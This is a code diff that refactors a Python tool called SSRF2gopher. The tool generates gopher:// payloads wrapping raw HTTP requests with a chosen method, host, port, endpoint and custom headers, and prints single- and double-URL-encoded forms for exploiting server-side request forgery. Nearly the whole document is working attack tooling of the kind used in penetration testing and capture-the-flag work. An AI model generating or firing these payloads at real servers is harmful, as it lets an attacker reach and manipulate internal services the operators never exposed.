@@ -1,11 +1,13 @@
 import urllib.parse
+import argparse
+import sys
 
 def banner():
     banner = '''
    ___________  _______                 __          
-  / __/ __/ _ \/ __/_  |___ ____  ___  / /  ___ ____
- _\ \_\ \/ , _/ _// __// _ `/ _ \/ _ \/ _ \/ -_) __/
-/___/___/_/|_/_/ /____/\_, /\___/ .__/_//_/\__/_/   
+  / __/ __/ _ \\/ __/_  |___ ____  ___  / /  ___ ____
+ _\\ \\_\\ \\/ , _/ _// __// _ `/ _ \\/ _ \\/ _ \\/ -_) __/
+/___/___/_/|_/_/ /____/\\_, /\\___/ .__/_//_/\\__/_/   
                       /___/    /_/                  
 
 Created by eMVee 
@@ -13,84 +15,124 @@ Created by eMVee
     return banner
 
 def url_encode_payload(data):
-    # Only  ' ', '=' and '&' characters
     encoded_data = data.replace(' ', '%20').replace('=', '%3d').replace('&', '%26')
-    # Replace newline characters with their URL-encoded equivalent
     encoded_data = encoded_data.replace('\n', '%0a')
-
     return encoded_data
 
 def double_url_encode_payload(data):
-    # Encode the ':' Double encode the ' ' from `%20` to '%2520' characters
     encoded_data = data.replace(':', '%3a').replace('%20', '%2520')
-    # Replace newline character from '%0a' to '%250a'
     encoded_data = encoded_data.replace('%0a', '%250a')
-
     return encoded_data
 
-
 def another_option(data):
-    # Encode the ':' Double encode the ' ' from `%20` to '%2520' characters
     encoded_data = data.replace(':', '%3a').replace('/', '%2F').replace('%20', '%2520')
-    # Replace newline character from '%0a' to '%250a'
     encoded_data = encoded_data.replace('%0a', '%250a')
-
     return encoded_data
 
 def host_header(host):
-    host_target = "Host: " + host
-    return host_target
+    return "Host: " + host
 
-def content_type_header():
-    content_type = "Content-Type: application/x-www-form-urlencoded"
-    return content_type
+def generate_gopher_request(host, port, endpoint, method):
+    return f"gopher://{host}:{port}/_{method} {endpoint} HTTP/1.1"
 
-def calculate_content_length(data):
-    # The 'len()' function in Python returns the number of elements in a string for the content length header
-    content_length = "Content-Length: " + str(len(data))
-    return content_length
-
-def generate_gopher_post(host,port,endpoint):
-    gopher_command = "gopher://" + host + ":" + str(port) + "/_POST " + endpoint + " HTTP/1.1"
-    return gopher_command
-
-def generate_gopher_payload():
-    payload = generate_gopher_post(host,port,endpoint) + "\n"
+def generate_gopher_payload(host, port, endpoint, custom_headers, method):
+    payload = generate_gopher_request(host, port, endpoint, method) + "\n"
     payload += host_header(host) + "\n"
-    payload += content_type_header() + "\n"
-    payload += calculate_content_length(data) + "\n"
-    payload += "\n"
-    payload += data
-    return(payload)
+    
+    # Add custom headers
+    for header, value in custom_headers.items():
+        payload += f"{header}: {value}\n"
+    
+    payload += "\n"  # Empty line to separate headers from body
+    return payload
 
+def parse_headers(headers_list):
+    custom_headers = {}
+    if headers_list:
+        for header in headers_list:
+            try:
+                name, value = header.split(':', 1)
+                custom_headers[name.strip()] = value.strip()
+            except ValueError:
+                print(f"[!] Invalid header format: {header}")
+                print("Headers should be in the format 'Name:Value'")
+                sys.exit(1)
+    return custom_headers
 
-print(banner())
-try:
-    # Example usage: localhost
-    print("[?] What is the address of the Host? ")
-    host = input()
-    # Example usage: 80
-    print("[?] What port should be used for gopher? ")
-    port = input()
-    # Example usage: /api/user/create
-    print("[?] What endpoint should be used for gopher? ")
-    endpoint = input()
-    #Example usage of data to submit: username=white.rabbit&password=dontbelate
-    print("[?] What data would you like to post? ")
-    data = input()
+def main():
+    parser = argparse.ArgumentParser(description='Gopher payload generator with custom headers support')
+    parser.add_argument('-u', '--host', help='Target host address')
+    parser.add_argument('-p', '--port', help='Gopher port number')
+    parser.add_argument('-e', '--endpoint', help='Target endpoint')
+    parser.add_argument('-H', '--headers', nargs='*', help='Custom headers in format "Name:Value"')
+    parser.add_argument('-m', '--method', help='HTTP method (GET, POST, PUT, etc.)')
+    
+    args = parser.parse_args()
 
-    print("\n[!] Plain text payload:")
-    print("\n")
-    print(generate_gopher_payload())
+    print(banner())
 
+    # Get host
+    if args.host:
+        host = args.host
+    else:
+        print("[?] What is the address of the Host? ")
+        host = input()
 
-    encoded_payload = url_encode_payload(generate_gopher_payload())
-    print("\n[!] URL encoded payload:")
-    print(encoded_payload)
-    print("\n[!] Double URL encoded payload:")
-    print(double_url_encode_payload(encoded_payload))
-    print("\n[!] Another option that might work via something like BURP:")
-    print(another_option(encoded_payload))
+    # Get port
+    if args.port:
+        port = args.port
+    else:
+        print("[?] What port should be used for gopher? ")
+        port = input()
 
-except KeyboardInterrupt:
-    print("\n[!] Script interrupted by user. Exiting...")
+    # Get endpoint
+    if args.endpoint:
+        endpoint = args.endpoint
+    else:
+        print("[?] What endpoint should be used for gopher? ")
+        endpoint = input()
+
+    # Get HTTP method
+    if args.method:
+        method = args.method.upper()
+    else:
+        print("[?] What HTTP method should be used? (GET, POST, PUT, etc.) ")
+        method = input().upper()
+        if not method:
+            method = "GET"  # Default to GET if no input provided
+
+    # Handle custom headers
+    if args.headers:
+        custom_headers = parse_headers(args.headers)
+    else:
+        custom_headers = {}
+        print("[?] Would you like to add custom headers? (y/n)")
+        if input().lower() == 'y':
+            while True:
+                print("[?] Enter header (or press enter to finish): ")
+                user_input = input().strip()
+                if not user_input:
+                    break
+                header, value = user_input.split(":")
+                custom_headers[header.strip()] = value.strip()
+
+    try:
+        print("\n[!] Plain text payload:")
+        print("\n")
+        payload = generate_gopher_payload(host, port, endpoint, custom_headers, method)
+        print(payload)
+
+        encoded_payload = url_encode_payload(payload)
+        print("\n[!] URL encoded payload:")
+        print(encoded_payload)
+        print("\n[!] Double URL encoded payload:")
+        print(double_url_encode_payload(encoded_payload))
+        print("\n[!] Another option that might work via something like BURP:")
+        print(another_option(encoded_payload))
+
+    except KeyboardInterrupt:
+        print("\n[!] Script interrupted by user. Exiting...")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
